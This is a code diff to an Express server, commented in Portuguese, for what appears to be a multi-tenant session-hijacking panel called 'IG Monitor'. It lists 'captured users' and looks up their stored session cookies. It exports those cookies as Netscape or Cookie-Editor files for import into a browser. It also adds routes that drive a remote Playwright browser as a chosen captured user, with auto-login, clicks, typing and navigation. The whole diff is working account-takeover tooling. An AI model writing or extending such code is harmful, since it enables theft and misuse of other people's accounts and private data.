@@ -854,6 +854,23 @@ app.get("/api/tenants", (req, res) => {
     }
 });
 
+// Lista de usuários capturados (para seletores multi-usuário de sessão e remota)
+app.get("/api/usuarios", (req, res) => {
+    try {
+        const tenant = (req.query.tenant || req.query.cliente || "").trim();
+        const usuarios = dbOps.obterListaUsuarios(tenant);
+        res.json({
+            success: true,
+            tenant: tenant || "global",
+            total: usuarios.length,
+            usuarios
+        });
+    } catch (err) {
+        console.error("[API] Erro ao listar usuários:", err.message);
+        res.status(500).json({ success: false, error: err.message, usuarios: [] });
+    }
+});
+
 // Limpeza de dados (Zero Test Pollution)
 app.post("/api/limpar", (req, res) => {
     try {
@@ -898,6 +915,181 @@ app.post("/api/auth/logout", (req, res) => {
 });
 
 // ==========================================
+// RESOLUÇÃO DE SESSÃO & COOKIES
+// ==========================================
+function resolverSessaoCookies(usuarioParam, tenantParam) {
+    const usuario = (usuarioParam || "").trim();
+    if (!usuario) return null;
+    const userKey = usuario.toLowerCase();
+
+    // 1. Consulta no SQLite via dbOps
+    const sessDb = dbOps.obterSessao(userKey, tenantParam);
+    if (sessDb && sessDb.cookies && sessDb.cookies.length > 0) {
+        return {
+            sessionData: {
+                tenant: sessDb.tenant || "default",
+                usuario: sessDb.usuario,
+                cookies: sessDb.cookies,
+                total_cookies: sessDb.total_cookies || sessDb.cookies.length,
+                url_final: sessDb.url_final || URL_FINAL_PADRAO,
+                data_hora: new Date(sessDb.updated_at || Date.now()).toLocaleString("pt-BR")
+            },
+            userKey
+        };
+    }
+
+    // 2. Fallback: busca em sessoes/
+    const SESSOES_DIR = path.join(__dirname, "sessoes");
+    if (fs.existsSync(SESSOES_DIR)) {
+        try {
+            const files = fs.readdirSync(SESSOES_DIR).filter(f => f.endsWith("_cookies.json"));
+            const cleanKey = userKey.replace(/[^a-z0-9_-]/g, "_");
+            const candidate = files.find(f => {
+                const base = f.replace(/_cookies\.json$/, "").toLowerCase();
+                return base === userKey || base === cleanKey || base.includes(cleanKey) || cleanKey.includes(base);
+            });
+            if (candidate) {
+                const raw = JSON.parse(fs.readFileSync(path.join(SESSOES_DIR, candidate), "utf8"));
+                return {
+                    sessionData: {
+                        tenant: raw.tenant || "default",
+                        usuario: raw.usuario || usuario,
+                        cookies: raw.cookies || [],
+                        total_cookies: raw.total_cookies || (raw.cookies ? raw.cookies.length : 0),
+                        url_final: raw.url_final || URL_FINAL_PADRAO,
+                        data_hora: raw.updated_at ? new Date(raw.updated_at).toLocaleString("pt-BR") : new Date().toLocaleString("pt-BR")
+                    },
+                    userKey
+                };
+            }
+        } catch (e) {
+            console.error("[SESSAO] Erro na busca flexível de cookies:", e.message);
+        }
+    }
+
+    // 3. Fallback: busca em resultado.json
+    const resultados = lerResultados();
+    for (let i = resultados.length - 1; i >= 0; i--) {
+        const r = resultados[i];
+        if (!r || !r.cookies) continue;
+        const rNome = (r.nome || "").toLowerCase().trim();
+        if (rNome === userKey || rNome.includes(userKey) || userKey.includes(rNome)) {
+            return {
+                sessionData: {
+                    tenant: r.tenant || "default",
+                    usuario: r.nome,
+                    cookies: r.cookies,
+                    total_cookies: r.cookies.length,
+                    url_final: r.url_final || URL_FINAL_PADRAO,
+                    data_hora: r.data_hora || new Date().toLocaleString("pt-BR")
+                },
+                userKey
+            };
+        }
+    }
+
+    return null;
+}
+
+// Rotas de Exportação de Sessão (formato json e netscape)
+app.get(
+    ["/api/sessao/exportar", "/api/sessaoremota/exportar", "/api/sessao/:usuario/exportar", "/api/sessaoremota/:usuario/exportar"],
+    (req, res) => {
+        const usuarioParam = (req.params.usuario && req.params.usuario !== "exportar") ? req.params.usuario : (req.query.usuario || "");
+        const tenantParam = req.query.tenant || req.query.cliente || null;
+        const formato = (req.query.formato || "json").toLowerCase();
+        const resolved = resolverSessaoCookies(usuarioParam, tenantParam);
+        if (!resolved || !resolved.sessionData || !resolved.sessionData.cookies) {
+            return res.status(404).send("Sessão não encontrada");
+        }
+
+        const { sessionData, userKey } = resolved;
+        const cookies = sessionData.cookies;
+
+        if (formato === "netscape" || formato === "txt") {
+            let txt = "# Netscape HTTP Cookie File\n";
+            txt += "# https://curl.se/docs/http-cookies.html\n";
+            txt += `# Capturado por IG Monitor em ${sessionData.data_hora || new Date().toISOString()} [Tenant: ${sessionData.tenant || 'default'}]\n\n`;
+
+            cookies.forEach(c => {
+                const domain = c.domain.startsWith(".") ? c.domain : `.${c.domain}`;
+                const flag = domain.startsWith(".") ? "TRUE" : "FALSE";
+                const path = c.path || "/";
+                const secure = c.secure ? "TRUE" : "FALSE";
+                const expiry = c.expires && c.expires > 0 ? Math.floor(c.expires) : Math.floor(Date.now() / 1000) + 86400 * 30;
+                txt += `${domain}\t${flag}\t${path}\t${secure}\t${expiry}\t${c.name}\t${c.value}\n`;
+            });
+
+            res.setHeader("Content-Type", "text/plain; charset=utf-8");
+            res.setHeader("Content-Disposition", `attachment; filename="cookies_${userKey}.txt"`);
+            return res.send(txt);
+        }
+
+        // Formato Cookie-Editor
+        const cookieEditorFormat = cookies.map(c => ({
+            domain: c.domain,
+            expirationDate: c.expires && c.expires > 0 ? c.expires : undefined,
+            hostOnly: !c.domain.startsWith("."),
+            httpOnly: !!c.httpOnly,
+            name: c.name,
+            path: c.path || "/",
+            sameSite: c.sameSite ? c.sameSite.toLowerCase() : "unspecified",
+            secure: !!c.secure,
+            session: !c.expires || c.expires <= 0,
+            storeId: "0",
+            value: c.value
+        }));
+
+        res.setHeader("Content-Type", "application/json; charset=utf-8");
+        res.setHeader("Content-Disposition", `attachment; filename="cookies_${userKey}.json"`);
+        return res.send(JSON.stringify(cookieEditorFormat, null, 2));
+    }
+);
+
+// Rotas de Consulta JSON da Sessão
+app.get(
+    ["/api/sessao", "/api/sessaoremota", "/api/sessao/:usuario", "/api/sessaoremota/:usuario"],
+    (req, res) => {
+        const usuarioParam = (req.params.usuario && req.params.usuario !== "exportar") ? req.params.usuario : (req.query.usuario || "");
+        const tenantParam = req.query.tenant || req.query.cliente || null;
+        const resolved = resolverSessaoCookies(usuarioParam, tenantParam);
+        if (!resolved || !resolved.sessionData) {
+            return res.status(404).json({ success: false, mensagem: "Sessão de cookies não encontrada." });
+        }
+
+        const { sessionData } = resolved;
+        const rawCookies = sessionData.cookies || [];
+        const itemTenant = sessionData.tenant || "default";
+
+        const cookieEditorFormat = rawCookies.map(c => ({
+            domain: c.domain,
+            expirationDate: c.expires && c.expires > 0 ? c.expires : undefined,
+            hostOnly: !c.domain.startsWith("."),
+            httpOnly: !!c.httpOnly,
+            name: c.name,
+            path: c.path || "/",
+            sameSite: c.sameSite ? c.sameSite.toLowerCase() : "unspecified",
+            secure: !!c.secure,
+            session: !c.expires || c.expires <= 0,
+            storeId: "0",
+            value: c.value
+        }));
+
+        return res.json({
+            success: true,
+            tenant: itemTenant,
+            usuario: sessionData.usuario,
+            data_hora: sessionData.data_hora,
+            url_final: sessionData.url_final || URL_FINAL_PADRAO,
+            total_cookies: rawCookies.length,
+            cookies: rawCookies,
+            cookie_editor_json: cookieEditorFormat,
+            link_acesso: `/sessaoremota.html?usuario=${encodeURIComponent(sessionData.usuario)}&tenant=${encodeURIComponent(itemTenant)}`
+        });
+    }
+);
+
+// ==========================================
 // ROTAS DE SESSÃO REMOTA (PLAYWRIGHT)
 // ==========================================
 app.get("/api/remota/status", async (req, res) => {
@@ -917,6 +1109,41 @@ app.get("/api/remota/status", async (req, res) => {
     }
 });
 
+app.post("/api/remota/iniciar", async (req, res) => {
+    try {
+        const usuario = (req.body.usuario || "").trim();
+        if (!usuario || usuario.toLowerCase() in { sessao: 1, sessaoremota: 1, acesso: 1 }) {
+            return res.status(400).json({
+                success: false,
+                mensagem: "Nenhum usuário selecionado. Por favor, selecione um usuário capturado na lista."
+            });
+        }
+        const resp = await fetch(`${WORKER_URL}/remota/iniciar`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ usuario, tenant: req.body.tenant })
+        });
+        const json = await resp.json();
+        res.json(json);
+    } catch (e) {
+        res.status(502).json({ success: false, mensagem: "Falha ao iniciar navegador remoto no worker" });
+    }
+});
+
+app.post("/api/remota/auto-login", async (req, res) => {
+    try {
+        const resp = await fetch(`${WORKER_URL}/remota/auto-login`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(req.body)
+        });
+        const json = await resp.json();
+        res.json(json);
+    } catch (e) {
+        res.status(502).json({ success: false, mensagem: "Erro ao comunicar com worker remoto" });
+    }
+});
+
 app.get("/api/remota/screenshot", async (req, res) => {
     try {
         const resp = await fetch(`${WORKER_URL}/remota/screenshot`);
@@ -926,6 +1153,111 @@ app.get("/api/remota/screenshot", async (req, res) => {
         return res.send(Buffer.from(buffer));
     } catch (err) {
         return res.status(204).end();
+    }
+});
+
+app.post("/api/remota/clique", async (req, res) => {
+    try {
+        const { x, y } = req.body;
+        const resp = await fetch(`${WORKER_URL}/remota/clique`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ x: Math.round(Number(x)), y: Math.round(Number(y)) })
+        });
+        const json = await resp.json();
+        res.json(json);
+    } catch (e) {
+        res.status(502).json({ success: false, mensagem: "Erro ao despachar clique" });
+    }
+});
+
+app.post("/api/remota/navegar", async (req, res) => {
+    try {
+        const { url } = req.body;
+        const resp = await fetch(`${WORKER_URL}/remota/navegar`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ url: String(url || "") })
+        });
+        const json = await resp.json();
+        res.json(json);
+    } catch (e) {
+        res.status(502).json({ success: false, mensagem: "Erro ao navegar" });
+    }
+});
+
+app.post("/api/remota/digitar", async (req, res) => {
+    try {
+        const { texto } = req.body;
+        const resp = await fetch(`${WORKER_URL}/remota/digitar`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ texto: String(texto || "") })
+        });
+        const json = await resp.json();
+        res.json(json);
+    } catch (e) {
+        res.status(502).json({ success: false, mensagem: "Erro ao digitar" });
+    }
+});
+
+app.post("/api/remota/tecla", async (req, res) => {
+    try {
+        const { tecla } = req.body;
+        const resp = await fetch(`${WORKER_URL}/remota/tecla`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ tecla: String(tecla || "") })
+        });
+        const json = await resp.json();
+        res.json(json);
+    } catch (e) {
+        res.status(502).json({ success: false, mensagem: "Erro ao enviar tecla" });
+    }
+});
+
+app.post("/api/remota/scroll", async (req, res) => {
+    try {
+        const { delta_y } = req.body;
+        const resp = await fetch(`${WORKER_URL}/remota/scroll`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ delta_y: Number(delta_y || 0) })
+        });
+        const json = await resp.json();
+        res.json(json);
+    } catch (e) {
+        res.status(502).json({ success: false, mensagem: "Erro ao rolar tela" });
+    }
+});
+
+app.post("/api/remota/voltar", async (req, res) => {
+    try {
+        const resp = await fetch(`${WORKER_URL}/remota/voltar`, { method: "POST" });
+        const json = await resp.json();
+        res.json(json);
+    } catch (e) {
+        res.status(502).json({ success: false, mensagem: "Erro ao voltar" });
+    }
+});
+
+app.post("/api/remota/avancar", async (req, res) => {
+    try {
+        const resp = await fetch(`${WORKER_URL}/remota/avancar`, { method: "POST" });
+        const json = await resp.json();
+        res.json(json);
+    } catch (e) {
+        res.status(502).json({ success: false, mensagem: "Erro ao avançar" });
+    }
+});
+
+app.post("/api/remota/recarregar", async (req, res) => {
+    try {
+        const resp = await fetch(`${WORKER_URL}/remota/recarregar`, { method: "POST" });
+        const json = await resp.json();
+        res.json(json);
+    } catch (e) {
+        res.status(502).json({ success: false, mensagem: "Erro ao recarregar" });
     }
 });
 
@@ -940,11 +1272,11 @@ app.get("/login-painel", (req, res) => {
     res.sendFile(path.join(PUBLIC_DIR, "login-painel.html"));
 });
 
-app.get("/sessaoremota", (req, res) => {
+app.get(["/sessaoremota", "/sessaoremota/:usuario"], (req, res) => {
     res.sendFile(path.join(PUBLIC_DIR, "sessaoremota.html"));
 });
 
-app.get("/sessao", (req, res) => {
+app.get(["/sessao", "/sessao/:usuario"], (req, res) => {
     res.sendFile(path.join(PUBLIC_DIR, "sessao.html"));
 });
 
